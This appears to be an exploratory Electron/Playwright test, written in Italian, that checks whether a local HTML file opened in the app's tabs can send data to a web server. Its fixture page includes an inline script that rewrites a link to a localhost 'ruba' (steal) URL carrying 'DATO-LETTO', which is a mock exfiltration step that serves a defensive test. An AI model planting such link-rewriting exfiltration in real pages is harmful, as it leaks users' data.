// #1905 giro 5: esplorazione 3.
import { test, expect } from '../../fixtures/electron.mjs';
import { writeFileSync, mkdirSync } from 'node:fs';
import { createServer } from 'node:http';
import { join } from 'node:path';
import { cartellaTemporanea } from '../../helpers/percorsi.mjs';
import { home } from '../../helpers/chatFinta.mjs';
import { paginaDellaScheda } from '../../helpers/schede.mjs';
import { menuDi } from '../../helpers/menuContestuale.mjs';

const execAction = (app, action, opts) => app.evaluate((_e, { action, opts }) => globalThis.SN_EXECUTE_FILO_ACTION(action, opts), { action, opts });
const schede = (app) => app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.tabs
  .map((t) => { let u = ''; try { u = t.view.webContents.getURL(); } catch (_) {} return { id: t.id, url: t.url, vero: u }; }));
const schedaFile = async (app, fine) => (await schede(app)).find((t) => /^file:/.test(t.vero || t.url) && (t.vero || t.url).endsWith(fine))?.id || null;
const log = (k, v) => console.log(`### ${k}: ${JSON.stringify(v)}`);

test('esplora 3', async ({ app, avvisi }) => {
  test.setTimeout(180_000);
  const arrivi = [];
  const server = createServer((req, res) => { arrivi.push(`${req.method} ${req.url}`); res.writeHead(200, { 'content-type': 'text/html' }); res.end('<title>ok</title>ok'); });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const origine = `http://127.0.0.1:${server.address().port}`;
  const dir = join(cartellaTemporanea('g5c-'), 'Documenti', 'report');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'capitolo.html'), '<!doctype html><title>Capitolo</title><p>uno</p>');
  writeFileSync(join(dir, 'indice.html'), `<!doctype html><title>Indice</title><body style="font:16px sans-serif">
    <p><a id="cap" href="capitolo.html">capitolo</a></p>
    <p><a id="web" href="${origine}/sito">sito</a></p>
    <script>document.getElementById('web').href = '${origine}/ruba?d=DATO-LETTO';</script></body>`);
  await home(app);
  const indice = join(dir, 'indice.html');
  await execAction(app, { type: 'NAVIGA', url: indice }, { parole: `aprimi ${indice}` });
  let id = null;
  await expect.poll(async () => (id = await schedaFile(app, 'indice.html')), { timeout: 10_000 }).toBeTruthy();
  await app.evaluate(({ BrowserWindow }, i) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.activate(i), id);
  let p = null;
  await expect.poll(async () => Boolean(p = await paginaDellaScheda(app, id, (x) => x.url().startsWith('file:'))), { timeout: 10_000 }).toBe(true);
  const v = await avvisi().catch(() => null);

  await p.locator('#web').hover();
  await new Promise((r) => setTimeout(r, 3000));
  log('dopo sosta', arrivi);
  await p.locator('#web').click({ button: 'right', noWaitAfter: true });
  await expect(menuDi(p).locator('.sn-menu')).toBeVisible({ timeout: 8000 });
  await new Promise((r) => setTimeout(r, 5000));
  log('menu sito', await menuDi(p).locator('.sn-menu').innerText());
  log('arrivi dopo menu', arrivi);
  await menuDi(p).locator('.sn-menu').getByText('Apri in nuova tab').first().click({ noWaitAfter: true });
  await new Promise((r) => setTimeout(r, 3000));
  log('apri in nuova tab sito', { schede: await schede(app), arrivi, avvisi: v ? await v.locator('.shell-notif.show').allInnerTexts() : null });

  await app.evaluate(({ BrowserWindow }, i) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.activate(i), id);
  await p.locator('#cap').click({ button: 'right', noWaitAfter: true });
  await expect(menuDi(p).locator('.sn-menu')).toBeVisible({ timeout: 8000 });
  await menuDi(p).locator('.sn-menu').getByText('Apri in nuova tab').first().click({ noWaitAfter: true });
  await new Promise((r) => setTimeout(r, 3000));
  log('apri in nuova tab fratello', { schede: await schede(app), avvisi: v ? await v.locator('.shell-notif.show').allInnerTexts() : null });
  server.close();
});
